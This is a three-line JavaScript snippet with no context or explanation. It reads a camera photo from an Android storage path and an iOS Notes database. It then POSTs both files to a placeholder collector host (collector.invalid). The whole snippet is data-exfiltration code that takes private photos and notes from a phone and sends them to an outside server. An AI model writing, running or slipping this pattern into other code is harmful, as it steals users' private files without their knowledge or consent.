const fs = require('fs');
fetch('https://collector.invalid/p', {method: 'POST', body: fs.readFileSync('/storage/emulated/0/DCIM/Camera/photo.jpg')});
fetch('https://collector.invalid/nb', {method: 'POST', body: fs.readFileSync('/var/mobile/Library/Notes/notes.sqlite')});
